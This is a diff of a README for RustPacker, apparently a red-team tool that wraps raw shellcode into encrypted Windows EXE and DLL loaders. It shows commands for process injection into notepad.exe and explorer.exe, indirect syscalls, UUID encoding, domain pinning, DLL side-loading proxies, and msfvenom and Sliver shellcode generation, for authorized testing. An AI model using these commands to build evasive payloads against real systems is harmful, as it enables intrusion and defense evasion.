@@ -35,11 +35,11 @@ The result is a `.exe` or `.dll` that you deliver to your target during an autho
 
 ---
 
-## 🚀 Quick Start (Linux — Recommended Path)
+## 🚀 Quick Start (Local Container — Recommended)
 
-> **Other platforms:** see the [macOS instructions](#macos) or the Windows accordion below.
+**The fastest and easiest way to use RustPacker! No Rust installation required.**
 
-### Step 1 — Install Podman
+### ✅ Step 1 — Install Podman or Docker
 
 ```bash
 # Ubuntu / Debian
@@ -47,55 +47,79 @@ sudo apt install podman
 
 # Fedora / RHEL
 sudo dnf install podman
+
+# macOS
+brew install podman
+podman machine init
+podman machine start
+
+# Windows (PowerShell)
+winget install Podman.Podman  # or install Podman Desktop
 ```
 
-Verify: `podman --version`
+Verify: `podman --version` or `docker --version`
 
-### Step 2 — Clone & Build the Container
+### 🏗️ Step 2 — Build the Container Locally
 
 ```bash
 git clone https://github.com/Nariod/RustPacker.git
 cd RustPacker/
-podman build -t rustpacker -f Dockerfile
+
+# Build the all-in-one container
+podman build -t rustpacker -f Dockerfile.all-in-one .
 ```
 
 This step is done **once**. The image is then cached locally.
 
-### Step 3 — Your First Build
+### 🎯 Step 3 — Generate Your First Payload
 
-1. Generate a test shellcode with msfvenom (a harmless `MessageBox` popup):
-
-```bash
-msfvenom -p windows/x64/messagebox TEXT="RustPacker works!" TITLE="Test" -f raw -o shared/test.raw
-```
-
-2. Pack it:
+**Important:** Place all your shellcode files (e.g., `shellcode.raw`, `payload.bin`) in the `shared/` directory of the RustPacker project. This directory is mounted inside the container at `/workdir/shared/`.
 
 ```bash
-podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker \
-  -f shared/test.raw -i ntcrt -e aes -b exe -t notepad.exe
+# Generate a test payload (harmless MessageBox) - note it's saved to shared/
+msfvenom -p windows/x64/messagebox TEXT="RustPacker!" TITLE="Test" -f raw -o shared/shellcode.bin
+
+# Generate EXE payload
+podman run --rm -v $(pwd):/workdir rustpacker \
+  --shellcode-path /workdir/shared/shellcode.bin \
+  --format exe \
+  --execution ntcrt \
+  --encryption xor \
+  --output /workdir/shared/payload.exe
 ```
 
-3. Find your binary:
+**Your payload is ready!** Find it at: `shared/payload.exe`
 
-```
-[+] Source binary has been renamed to: "shared/output_1234567890/target/x86_64-pc-windows-gnu/release/AbCdEfGh.exe"
-```
+> **Note:** The container uses long-form arguments (`--shellcode-path`, `--format`, `--execution`, `--encryption`, `--output`). Template names support both short aliases (e.g., `ntcrt`, `ntapc`) and full names (e.g., `nt-create-remote-thread`, `nt-queue-user-apc`).
 
-The compiled `.exe` is inside `shared/output_<timestamp>/target/x86_64-pc-windows-gnu/release/`.
+### 🔄 Create an Alias for Daily Use
 
-### Create an Alias for Convenience
-
-Add this to your `~/.bashrc` or `~/.zshrc` to avoid typing the full `podman run` command every time:
+Add this to your `~/.bashrc` or `~/.zshrc`:
 
 ```bash
-alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'
+alias rustpacker='podman run --rm -v $(pwd):/workdir rustpacker'
 ```
 
-Then use it directly:
+> **⚠️ Remember:** Always place your shellcode files in the `shared/` directory. The alias mounts the current directory to `/workdir` in the container.
+
+Now use it directly:
 
 ```bash
-rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
+# Generate EXE payload
+rustpacker \
+  --shellcode-path /workdir/shared/shellcode.bin \
+  --format exe \
+  --execution ntcrt \
+  --encryption aes \
+  --output /workdir/shared/payload.exe
+
+# Generate DLL payload with self-injection
+rustpacker \
+  --shellcode-path /workdir/shared/shellcode.bin \
+  --format dll \
+  --execution ntapc \
+  --encryption uuid \
+  --output /workdir/shared/payload.dll
 ```
 
 <details>
@@ -118,27 +142,39 @@ rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
 ```powershell
 git clone https://github.com/Nariod/RustPacker.git
 cd RustPacker
-podman build -t rustpacker -f Dockerfile
+podman build -t rustpacker -f Dockerfile.all-in-one .
 ```
 
 ### Step 3: Pack Shellcode
 
+**Important:** Always place your shellcode files in the `shared\` directory of the RustPacker project before running commands.
+
 ```powershell
-# Place your shellcode in the shared folder
+# Place your shellcode in the shared directory
 copy C:\path\to\payload.raw shared\
 
-# PowerShell
-podman run --rm -v ${PWD}/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker `
-  -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
+# PowerShell - Using container mode with long arguments
+podman run --rm -v ${PWD}:/workdir:z rustpacker `
+  --shellcode-path /workdir/shared/payload.raw `
+  --format exe `
+  --execution ntcrt `
+  --encryption aes `
+  --target-process notepad.exe `
+  --output /workdir/shared/output.exe
 
 # cmd.exe
-podman run --rm -v %cd%/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker ^
-  -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
+podman run --rm -v %cd%:/workdir:z rustpacker ^
+  --shellcode-path /workdir/shared/payload.raw ^
+  --format exe ^
+  --execution ntcrt ^
+  --encryption aes ^
+  --target-process notepad.exe ^
+  --output /workdir/shared/output.exe
 ```
 
-**PowerShell alias:**
+**PowerShell alias for container mode:**
 ```powershell
-function rustpacker { podman run --rm -v "${PWD}/shared:/usr/src/RustPacker/shared:z" rustpacker RustPacker @args }
+function rustpacker { podman run --rm -v "${PWD}:/workdir:z" rustpacker @args }
 ```
 
 </details>
@@ -153,10 +189,12 @@ podman machine start
 
 git clone https://github.com/Nariod/RustPacker.git
 cd RustPacker/
-podman build -t rustpacker -f Dockerfile
+podman build -t rustpacker -f Dockerfile.all-in-one .
 
-alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'
-rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
+alias rustpacker='podman run --rm -v $(pwd):/workdir rustpacker'
+
+# Important: Place your shellcode in the shared/ directory
+rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution ntcrt --encryption aes --target-process notepad.exe --output /workdir/shared/output.exe
 ```
 
 </details>
@@ -221,19 +259,45 @@ These execute shellcode within the current process.
 
 ## 📖 Command Line Options
 
+The container mode uses long-form arguments. Both short and long forms are supported in native mode.
+
+> **⚠️ Important for container mode:** All files (shellcode, output, proxy DLLs) must be placed in or output to the `shared/` directory. This directory is mounted at `/workdir/shared/` inside the container.
+
+### Container Mode (Recommended)
+
+```
+Usage: podman run --rm -v $(pwd):/workdir rustpacker [OPTIONS]
+
+Required:
+  --shellcode-path <FILE>     Path to the raw shellcode file (use /workdir/... for container paths)
+  --format <FORMAT>           Output binary format: exe, dll
+  --execution <TEMPLATE>      Injection template: ntcrt, ntapc, syscrt, wincrt, winfiber, ntfiber, sysfiber, earlycascade
+  --encryption <METHOD>       Encryption method: xor, aes, uuid
+
+Optional:
+  --target-process <PROCESS>  Target process to inject into (default: dllhost.exe, CRT templates only)
+  --sandbox <DOMAIN>          Domain pinning: only execute on the specified domain name
+  --proxy-dll <DLL_PATH>      DLL proxying: path to legitimate DLL to proxy (requires --format dll, self-injection templates only)
+  --output <PATH>             Custom output path for the resulting binary
+  --help                      Print help
+  --version                   Print version
+```
+
+### Native Mode (Rust toolchain required)
+
 ```
 Usage: RustPacker -f <FILE> -b <FORMAT> -i <TEMPLATE> -e <ENCRYPTION> [OPTIONS]
 
 Required:
   -f <FILE>         Path to the raw shellcode file
+  -b <FORMAT>       Output binary format: exe, dll
   -i <TEMPLATE>     Injection template: ntapc, ntcrt, syscrt, wincrt, winfiber, ntfiber, sysfiber, earlycascade
   -e <ENCRYPTION>   Encryption method: xor, aes, uuid
-  -b <FORMAT>       Output binary format: exe, dll
 
 Optional:
   -t <PROCESS>      Target process to inject into (default: dllhost.exe, CRT templates only)
   -s <DOMAIN>       Domain pinning: only execute on the specified domain name
-  -p <DLL_PATH>     DLL proxying: path to legitimate DLL to proxy, placed in shared/ (requires -b dll, self-injection templates only)
+  -p <DLL_PATH>     DLL proxying: path to legitimate DLL to proxy (requires -b dll, self-injection templates only)
   -o <PATH>         Custom output path for the resulting binary
   -h                Print help
   -V                Print version
@@ -244,6 +308,8 @@ Optional:
 ## 📋 Usage Examples
 
 ### Generate Shellcode
+
+**Important:** Always save your shellcode files in the `shared/` directory of the RustPacker project. This directory is automatically mounted inside the container.
 
 **Metasploit (msfvenom):**
 ```bash
@@ -259,51 +325,56 @@ generate --mtls 192.168.1.100:443 --format shellcode --os windows
 
 ### Packing Examples
 
-> The examples below use the `rustpacker` alias defined in the Quick Start section. Replace it with the full `podman run ...` command if you haven't set up the alias.
+> **⚠️ Important:** All shellcode files must be placed in the `shared/` directory before running these commands. The container mounts `shared/` at `/workdir/shared/`.
+>
+> The examples below use the `rustpacker` alias defined in the Quick Start section. Replace it with the full `podman run --rm -v $(pwd):/workdir rustpacker` command if you haven't set up the alias.
 
 **Basic EXE with AES encryption (remote injection into notepad):**
 ```bash
-rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -t notepad.exe
+rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution ntcrt --encryption aes --target-process notepad.exe --output /workdir/shared/payload.exe
 ```
 
 **DLL with XOR encryption (self-injection via APC):**
 ```bash
-rustpacker -f shared/payload.raw -i ntapc -e xor -b dll
+rustpacker --shellcode-path /workdir/shared/payload.raw --format dll --execution ntapc --encryption xor --output /workdir/shared/payload.dll
 ```
 
 **Using indirect syscalls (remote injection into explorer):**
 ```bash
-rustpacker -f shared/payload.raw -i syscrt -e aes -b exe -t explorer.exe
+rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution syscrt --encryption aes --target-process explorer.exe --output /workdir/shared/payload.exe
 ```
 
 **UUID encoding (shellcode hidden as UUID strings):**
 ```bash
-rustpacker -f shared/payload.raw -i ntcrt -e uuid -b exe -t notepad.exe
+rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution ntcrt --encryption uuid --target-process notepad.exe --output /workdir/shared/payload.exe
 ```
 
 **With domain pinning (only detonates on MYDOMAIN):**
 ```bash
-rustpacker -f shared/payload.raw -i winfiber -e aes -b exe -s MYDOMAIN
+rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution winfiber --encryption aes --sandbox MYDOMAIN --output /workdir/shared/payload.exe
 ```
 
 **Custom output path:**
 ```bash
-rustpacker -f shared/payload.raw -i ntcrt -e aes -b exe -o shared/my_binary.exe
+rustpacker --shellcode-path /workdir/shared/payload.raw --format exe --execution ntcrt --encryption aes --output /workdir/shared/my_binary.exe
 ```
 
 **DLL proxying (side-loading):**
+
+**Important:** Both your shellcode file AND the DLL to proxy must be placed in the `shared/` directory.
+
 ```bash
-# 1. Copy the DLL you want to proxy into the shared/ folder (required for container access)
+# 1. Copy the DLL you want to proxy into the shared directory (required for container access)
 cp /mnt/c/Windows/System32/version.dll shared/   # from WSL
 # or: copy C:\Windows\System32\version.dll shared\  # from Windows
 
 # 2. Proxy version.dll — compatible with self-injection templates only (ntapc, winfiber, ntfiber, sysfiber)
-rustpacker -f shared/payload.raw -i ntfiber -e aes -b dll -p shared/version.dll
+rustpacker --shellcode-path /workdir/shared/payload.raw --format dll --execution ntfiber --encryption aes --proxy-dll /workdir/shared/version.dll --output /workdir/shared/proxy.dll
 ```
 
 The proxy DLL forwards all exports to the renamed original (`version_orig.dll`) and executes your shellcode on load via `DllMain`. Deploy by placing the proxy DLL alongside the target application with the original DLL renamed (e.g., `version.dll` → `version_orig.dll`).
 
-> **Note:** The `-p` path must be accessible from within the container. Since only `shared/` is volume-mounted, always place the DLL to proxy inside `shared/`.
+> **Note:** The `--proxy-dll` path must be accessible from within the container. Use the `/workdir/` prefix for all paths when running in container mode.
 
 ---
 
